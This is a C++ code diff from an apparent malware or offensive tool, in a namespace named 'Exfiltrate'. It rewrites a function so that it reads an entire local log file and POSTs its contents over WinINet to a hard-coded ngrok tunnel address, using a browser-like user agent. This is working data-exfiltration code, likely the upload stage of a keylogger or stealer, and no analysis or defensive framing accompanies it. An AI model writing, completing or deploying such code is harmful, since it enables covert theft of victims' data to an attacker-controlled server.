@@ -15,17 +15,45 @@
 
 namespace Exfiltrate
 {
-	bool exfilLogs(std::string pathToExfilLogFile)
-	{
-		std::wstring headers = L"Content-Type: application/x-www-form-urlencoded; charset=utf-16";
-		std::wstring postData = L"os=test";
 
-		std::string ngrokTunnel = "7fd0-2601-2c7-4300-ac0-b988-2097-b67-790c.ngrok.io";
-		std::wstring temp = std::wstring(ngrokTunnel.begin(), ngrokTunnel.end());
-		LPCWSTR ngrokTunnelL = temp.c_str();
+	bool sendHttpPOST(std::string &httpServerP, std::string &postBodyP);
+
+
+	bool exfilLogs(std::string pathToLogFile)
+	{
+		std::ifstream inFile;
+		inFile.open(pathToLogFile); //open the input file
+
+		std::stringstream strStream;
+		strStream << inFile.rdbuf(); //read the file
+		std::string str = strStream.str(); //str holds the content of the file
+
+		std::string httpServer = "a6d4-2601-2c7-4300-ac0-5012-961d-d321-9cb3.ngrok.io";
+
+		if (sendHttpPOST(httpServer, str))
+		{
+			return true;
+		}
+		else
+		{
+			return false;
+		}
+		
+	}
+
+	bool sendHttpPOST(std::string &httpServerP, std::string &postBodyP)
+	{
+		std::wstring tmp1 = std::wstring(postBodyP.begin(), postBodyP.end());
+		LPCWSTR postBody = tmp1.c_str();
+		std::wstring postData = postBody;
+
+		std::wstring headers = L"Content-Type: application/x-www-form-urlencoded; charset=utf-16";
+
+		std::wstring tmp2 = std::wstring(httpServerP.begin(), httpServerP.end());
+		LPCWSTR httpServer = tmp2.c_str();
 
 		HINTERNET hSession = InternetOpen(
-			L"Mozilla/5.0", 
+			L"Mozilla/5.0",
 			INTERNET_OPEN_TYPE_PRECONFIG,
 			NULL,
 			NULL,
@@ -33,7 +61,7 @@ namespace Exfiltrate
 
 		HINTERNET hConnect = InternetConnect(
 			hSession,
-			ngrokTunnelL, //TARGET SERVER
+			httpServer, //TARGET SERVER
 			0,
 			L"",
 			L"",
@@ -51,8 +79,8 @@ namespace Exfiltrate
 			0,
 			0);
 
-		if (HttpSendRequest(hHttpFile, headers.c_str(), 
-			headers.length(), (LPVOID)postData.c_str(), 
+		if (HttpSendRequest(hHttpFile, headers.c_str(),
+			headers.length(), (LPVOID)postData.c_str(),
 			postData.length() * sizeof(wchar_t)))
 		{
 			return true;
